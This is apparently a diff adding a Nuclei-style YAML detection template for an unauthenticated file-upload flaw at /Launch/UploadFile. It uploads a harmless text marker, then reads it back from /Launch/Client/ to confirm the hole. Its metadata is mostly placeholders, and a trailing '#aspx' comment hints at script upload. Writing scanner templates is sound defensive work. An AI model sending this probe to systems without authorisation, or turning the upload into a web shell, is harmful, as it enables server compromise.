@@ -1,0 +1,35 @@
+id: sdjt-UploadFile-upload
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: description
+  reference:
+    - https://
+  tags: tags
+variables:
+  filename: "{{rand_base(6)}}"
+  
+http:
+  - raw:
+      - |-
+        POST /Launch/UploadFile?FileName={{filename}}.txt&Version=1&Size=100 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
+        Accept: */*
+        Content-Type: multipart/form-data; boundary=---------------------------45250802924973458471174811279
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Content-Length: 3
+
+        whoisceshi
+      - |+
+        GET /Launch/Client/{{filename}}.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'whoisceshi'        
+#aspx
